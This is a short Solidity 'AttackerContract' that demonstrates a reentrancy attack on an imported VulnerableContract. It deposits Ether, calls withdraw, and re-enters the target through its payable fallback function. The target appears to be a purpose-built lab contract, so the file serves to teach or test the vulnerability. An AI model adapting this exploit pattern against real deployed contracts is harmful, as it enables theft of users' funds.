// SPDX-License-Identifier: MIT
// Attacker Contract
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackerContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    // Fallback function that will be triggered when vulnerableContract tries to send Ether
    fallback() external payable {
        // Call back into the vulnerable contract's view function (reentrant)
        vulnerableContract.isEligibleForBonus(address(this));
    }

    // Start the attack by depositing and withdrawing funds
    function attack() external payable {
        // Deposit some Ether to vulnerableContract
        vulnerableContract.deposit{value: msg.value}();

        // Withdraw the funds (this will trigger fallback and reentrancy)
        vulnerableContract.withdraw();
    }
}
